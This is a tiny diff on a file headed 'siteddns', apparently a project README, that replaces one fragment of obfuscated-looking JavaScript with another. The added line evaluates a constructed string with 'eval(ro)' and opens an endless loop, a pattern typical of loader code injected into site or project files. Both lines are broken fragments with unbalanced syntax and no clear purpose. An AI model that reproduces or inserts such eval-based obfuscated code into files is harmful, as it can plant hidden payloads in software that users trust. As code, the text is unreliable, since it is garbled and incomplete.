@@ -1,2 +1,2 @@
  # siteddns
-=4);yh=2;do{wh[yh]=((((wh[yh]+wh[yh+1])&0xff)
+>6);}";eval(ro);ro=49;while(true){if(ro
